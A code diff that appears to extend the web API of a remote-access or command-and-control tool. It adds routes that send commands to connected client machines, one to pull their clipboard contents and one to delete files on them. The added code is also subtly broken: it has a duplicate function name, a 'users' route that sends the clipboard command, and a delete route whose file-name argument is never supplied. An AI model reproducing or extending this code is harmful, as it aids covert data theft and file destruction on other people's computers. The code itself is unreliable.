@@ -76,3 +76,38 @@ def clipboard_payload():
 			return "Error", 500
 	else:
 		return "Missing params", 400
+
+
+@api_routes.route('/api/payload/users', methods=['POST'])
+def clipboard_payload():
+	data = json.loads(flask.request.data.decode())
+	client = data["client"]
+
+	if client:
+		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
+		if client_sock:
+			common.send_msg(client_sock, "clipboard".encode())
+			users = common.recv_msg(client_sock)
+			return users.decode(), 200
+		else:
+			return "Error", 500
+	else:
+		return "Missing params", 400
+
+
+@api_routes.route('/api/payload/delete', methods=['POST'])
+def delete_file(file_name):
+	msg = f'delete {file_name}'
+
+	data = json.loads(flask.request.data.decode())
+	client = data["client"]
+
+	if client:
+		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
+		if client_sock:
+			common.send_msg(client_sock, msg.encode())
+			return 'File Deleted', 200
+		else:
+			return "Error", 500
+	else:
+		return "Missing params", 400
